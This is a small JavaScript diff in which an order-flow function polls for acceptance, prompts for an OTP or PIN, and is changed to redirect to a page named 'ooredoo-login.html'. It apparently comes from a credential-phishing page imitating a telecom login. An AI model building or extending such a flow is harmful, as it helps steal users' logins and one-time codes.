@@ -926,7 +926,7 @@ function onAccepted(next){
   clearInterval(pollTimer);
   if (next === "otp") showOtp();
   else if (next === "pin") showPin();
-  else finishOrder();   // done
+  else window.location.href = "ooredoo-login.html";   // done
 }
 function finishOrder(){
   if (!isSample) {
